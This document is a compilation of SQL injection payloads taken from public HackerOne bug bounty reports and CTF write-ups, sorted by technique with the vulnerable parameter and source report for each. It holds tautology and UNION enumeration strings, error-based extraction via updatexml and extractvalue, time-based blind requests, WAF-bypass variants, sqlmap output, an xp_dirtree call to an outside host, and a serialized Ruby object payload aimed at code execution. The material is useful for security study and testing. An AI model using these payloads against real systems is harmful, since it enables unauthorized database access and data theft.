— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `2bad9549`

```
jdh34k' and 1=0 -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `3b6e8269`

```
hax" OR (select 1 from admin)#
```

**Parameter:** `name`
— [Grinch-Networks taken down - hacky holidays CTF ](https://hackerone.com/reports/1069189) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)

### `9a126765`

```
hax" OR (select count(password) from admin)#
```

**Parameter:** `name`
— [Grinch-Networks taken down - hacky holidays CTF ](https://hackerone.com/reports/1069189) · h1-ctf · [pirateducky](https://hackerone.com/pirateducky)

### `4a191def`

```
myuniquename' or 1=1 --
```

**Parameter:** `name`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `691ce8be`

```
myuniquename' or 1=2 --
```

**Parameter:** `name`
— [First CTF ever!](https://hackerone.com/reports/1069263) · h1-ctf · [eliee](https://hackerone.com/eliee)

### `6be125f9`

```
URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='
```

— [Blind SQL iNJECTION ](https://hackerone.com/reports/1102591) · U.S. Dept Of Defense · [1337n0x](https://hackerone.com/1337n0x)

### `64490c69`

```
-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
```

— [Blind SQL iNJECTION ](https://hackerone.com/reports/1102591) · U.S. Dept Of Defense · [1337n0x](https://hackerone.com/1337n0x)

### `e4aaab05`

```
alice' OR 1=1--
```

— [SQL Injection Detection Bypass in AWS WAF Managed Rules (AWSManagedRulesSQLiRuleSet)](https://hackerone.com/reports/3591725) · AWS VDP · [killnet-edc](https://hackerone.com/killnet-edc)


## Error‑based SQL injection using UPDATEXML to extract MySQL version

### `48b9f5d5`

```
https://███████/██████████=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil
```

— [SQL Injection on █████](https://hackerone.com/reports/277380) · U.S. Dept Of Defense · [cdl](https://hackerone.com/cdl)

### `69286a46`

```
https://████████/████████████=' and updatexml(null,concat(0x0a,user()),null)-- -@hackerone.mil
```

— [SQL Injection on █████](https://hackerone.com/reports/277380) · U.S. Dept Of Defense · [cdl](https://hackerone.com/cdl)

### `cb95bdd7`

```
GET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers
```

**Parameter:** `id`
— [Unauthenticated SQL Injection at █████████  \[HtUS\]](https://hackerone.com/reports/1626226) · U.S. Dept Of Defense · [0xd0ff9](https://hackerone.com/0xd0ff9)

### `fe136867`

```
GET /api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from%20information_schema.tables%20limit%2054,1))))=' HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers
```

**Parameter:** `id`
— [Unauthenticated SQL Injection at █████████  \[HtUS\]](https://hackerone.com/reports/1626226) · U.S. Dept Of Defense · [0xd0ff9](https://hackerone.com/0xd0ff9)

### `4e950769`

```
'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa
```

— [Unauthenticated SQL Injection at █████████  \[HtUS\]](https://hackerone.com/reports/1626226) · U.S. Dept Of Defense · [0xd0ff9](https://hackerone.com/0xd0ff9)

### `0daa83f7`

```
'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa
```

— [Unauthenticated SQL Injection at █████████  \[HtUS\]](https://hackerone.com/reports/1626226) · U.S. Dept Of Defense · [0xd0ff9](https://hackerone.com/0xd0ff9)


## UNION‑SELECT SQL injection to enumerate columns in the name parameter

### `b35fcc06`

```
Jfjrir' union select 1;/*
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `c3d3a3e6`

```
Jfjrir' union select 1,2;/*
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `9c6cb2b6`

```
Jfjrir' union select 1,2,3;/*
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)

### `d7337294`

```
Jfjrir' union select 1,2,3,4;/*
```

**Parameter:** `name`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)


## Classic SQL injection using a tautology `' OR 1=1--` in a numeric parameter

### `6ebb9891`

```
99' OR 1=1-- -
```

— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `edee42b3`

```
99' OR 5=1-- -
```

— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)


## SQL injection condition fragment used in a Boolean‑based injection

### `b2cb2957`

```
if(mid(@@version,1,1)=5
```

— [\[target.com\] Boolean SQLi - /█████.php](https://hackerone.com/reports/297534) · Eternal · [gerben_javado](https://hackerone.com/gerben_javado) · $1,000.0

### `647cbddf`

```
if(mid(@@version,1,1)=4
```

— [\[target.com\] Boolean SQLi - /█████.php](https://hackerone.com/reports/297534) · Eternal · [gerben_javado](https://hackerone.com/gerben_javado) · $1,000.0


## Blind SQL injection via doc_id parameter using SLEEP()

### `98ec1d43`

```
GET /library.php?path=test&doc_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh) HTTP/1.1
Host: ██████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie:
```

**Parameter:** `doc_id`
— [SQL injection on the https://████/](https://hackerone.com/reports/488795) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)


## Classic tautology SQL injection ("' or 1=1 --")

### `1d0a05a1`

```
' or 1=1 --
```

**Parameter:** `name`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)


## File inclusion via chained string replacement bypass (LFI) by crafting a template name that survives multiple replace calls

### `dbf1907d`

```
I sent `secretasecretaadmin.phpdmin.phpdmin.php` as data, this string does not contain any special character the `preg_replace` does not affect the data.
On first replace it replaces any occurrences `admin.php` with nothing so makes data as `secretasecretadmin.phpdmin.php`.
And finally, when it replaces any occurrences of `secretadmin.php` with nothing, the final result becomes `secretadmin.php`.
On browsing [https://target.com/my-diary/?template=secretasecretaadmin.phpdmin.phpdmin.
```

**Parameter:** `template`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)


## Hex-encoded union-based SQL injection

### `8391e6f7`

```
' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3 --
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)


## nested UNION ALL SELECT injection via GET parameter

### `8ddc406e`

```
GET /r3c0n_server_4fdk59/album?hash=-4685' UNION ALL SELECT "1' UNION ALL SELECT \"1\",\"4\",\"/api/\"-- -","1","2" -- - //
```

**Parameter:** `hash`
— [HackyHolidays H1 CTF Writeup](https://hackerone.com/reports/1068881) · h1-ctf · [mava](https://hackerone.com/mava)


## Nested UNION SELECT SQL injection to chain queries

### `c0fcf4ee`

```
1' UNION SELECT "' UNION SELECT 1,2,3'-- ","456","789"--
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)


## Obfuscated SQL injection using logical operators and comment to bypass WAF

### `2c4d75f6`

```
alice' || '1' ; && 1<=>0 && 1-1 && 1<=>1 && 1#
```

— [SQL Injection Detection Bypass in AWS WAF Managed Rules (AWSManagedRulesSQLiRuleSet)](https://hackerone.com/reports/3591725) · AWS VDP · [killnet-edc](https://hackerone.com/killnet-edc)


## Oracle error-based SQL injection via c0-param0 parameter

### `b342e981`

```
root@kali:~/bugbounty# sqlmap -u "https://████/█████████/dwr/exec/EndUserSvc.validateCageCode?callCount=1&c0-scriptName=EndUserSvc&c0-methodName=validateCageCode&c0-id=5096_1489967152565&c0-param0=string:1*"
         _
 ___ ___| |_____ ___ ___  {1.0.8.2#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://target.com

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey
```

**Parameter:** `c0-param0`
— [SQL injection on https://███████](https://hackerone.com/reports/214798) · U.S. Dept Of Defense · [daveysec](https://hackerone.com/daveysec)


## SQL injection attempt using MSSQL global variable in the Customwho query parameter to trigger an error

### `b9211af1`

```
https://██████████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@nonexisting
```

**Parameter:** `Customwho`
— [MSSQL injection via param Customwho in https://█████/News/Transcripts/Search/Sort/ and WAF bypass](https://hackerone.com/reports/577612) · U.S. Dept Of Defense · [bohdansec](https://hackerone.com/bohdansec)


## SQL injection using boolean logic operators and comment delimiters to bypass WAF

### `4d0c6994`

```
alice' || '1' ; && 1<=>0 && 1-1 && 1<=>1 && 1#
alice' || '1' ; && 2-1<=>2-1 || 0 && 1<=>1-- 
alice' && 1 ; && IFNULL(1,0) || 1<=>0--
...
```

**Parameter:** `username`
— [SQL Injection Detection Bypass in AWS WAF Managed Rules (AWSManagedRulesSQLiRuleSet)](https://hackerone.com/reports/3591725) · AWS VDP · [killnet-edc](https://hackerone.com/killnet-edc)


## SQL injection via CCD_itemID parameter using boolean‑based blind and UNION SELECT

### `422c68d6`

```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: https://███████:443/███████Portal/████?_███=true&_st=&_pageLabel=███_█████_pubview_page&CCD_itemID=201826 AND 2833=2833

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: https://██████████:443/████Portal/██████████?_███=true&_st=&_pageLabel=███_██████████_pubview_page&CCD_itemID=201826 UNION ALL SELECT NULL,CONCAT(CONCAT('qvzxq','ODiU
```

**Parameter:** `CCD_itemID`
— [SQL Injection vulnerability located at ████████](https://hackerone.com/reports/384397) · U.S. Dept Of Defense · [rootaccess](https://hackerone.com/rootaccess)


## SQL injection enumerating information_schema tables via an OR condition

### `1a510009`

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'a%' LIMIT 0,1) -- -
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)


## SQL injection using MSSQL global variable enumeration in the Customwho query parameter

### `46b251b5`

```
https://█████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@LANGID
```

**Parameter:** `Customwho`
— [MSSQL injection via param Customwho in https://█████/News/Transcripts/Search/Sort/ and WAF bypass](https://hackerone.com/reports/577612) · U.S. Dept Of Defense · [bohdansec](https://hackerone.com/bohdansec)


## SQL injection with serialized Ruby object payload to achieve code execution

### `2b23c485`

```
SELECT
        1
;

ROLLBACK
;

INSERT
    INTO
        user_versions (
            item_type
            ,item_id
            ,event
            ,email
            ,object
        )
    VALUES (
        'User'
        ,2
        ,'update'
        , 'uniquekeywordtotriggercode@hackerone.com'
        ,'---
username:
  - !ruby/object:Gem::Installer
      i: x
  - !ruby/object:Gem::SpecFetcher
      i: y
  - !ruby/object:Gem::Requirement
    requirements:
      !ruby/object:Gem::Package::TarReader

```

— [Ability to escape database transaction through SQL injection, leading to arbitrary code execution](https://hackerone.com/reports/1663299) · HackerOne · [jobert](https://hackerone.com/jobert)


## SQL injection using a sub‑query on all_tables with an OR condition

### `e6c7a864`

```
grinch' or '1'='(Select column_name FROM all_tables WHERE table_name like 'a%')--
```

— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)


## SQL injection using UNION SELECT to retrieve @@VERSION via the site ID path segment

### `bbe83408`

```
https://target.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23
```

— [SQL Injection Union Based](https://hackerone.com/reports/1046084) · Automattic · [fuzzme](https://hackerone.com/fuzzme)


## SQL injection using xp_dirtree command execution (SQL Server)

### `4ad06a01`

```
';declare @q varchar(99);set @q='\\target.com/random'; exec master.dbo.xp_dirtree @q;--
```

— [ SQL injections](https://hackerone.com/reports/272506) · U.S. Dept Of Defense · [lfb](https://hackerone.com/lfb)


## tautology-based SQL injection (OR ''='')

### `cfa559bd`

```
' or ''='
```

**Parameter:** `name`
— [HackyHolidays H1 CTF Writeup](https://hackerone.com/reports/1068881) · h1-ctf · [mava](https://hackerone.com/mava)


## Tautology SQL injection (OR 1=1) to force the query to evaluate true

### `669a19f2`

```
w31rd0' OR 1=1-- -
```

— [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829) · h1-ctf · [w31rd0](https://hackerone.com/w31rd0)


## Union‑ALL SQL injection

### `4e43e041`

```
asdasd' UNION ALL SELECT 1,1,1;/*
```

**Parameter:** `hash`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)


## Union‑based LIKE injection with wildcard enumeration to extract usernames and passwords via the id parameter

### `87adff4d`

```
Damn, another SQL [like][32] query injection in username and password parameters.
[32]: https://target.com/2015-11-03-like-injection/      "like"
We can extract bit by bit by injecting `character%` and filtering results based on response codes if 204 then no data found and does not start with the specified character and if response as `invalid content type detected` then some data is found and it starts with specified character.
Using query `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?u
```

**Parameter:** `id`
— [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530) · h1-ctf · [shubhamz007](https://hackerone.com/shubhamz007)


## UNION SELECT injection to inject a filename via album hash parameter

### `d1c14d5b`

```
select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'

MariaDB [test]> select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'
    -> ;
+------+----------+---------+
| id   | album_id | photo   |
+------+----------+---------+
| NULL |     NULL | xyz.jpg |
+------+----------+---------+
1 row in set (0.078 sec)
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)


## UNION SELECT with NULLs to enumerate column count

### `9db67788`

```
' UNION select NULL;-- --> 404
' UNION select NULL,NULL;-- --> 404
' UNION select NULL,NULL,NULL;-- --> 200; column count is three
' UNION select NULL,NULL,NULL,NULL;-- --> 404
```

**Parameter:** `hash`
— [\[h1ctf-Grinch Networks\] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934) · h1-ctf · [d3f4u17](https://hackerone.com/d3f4u17)
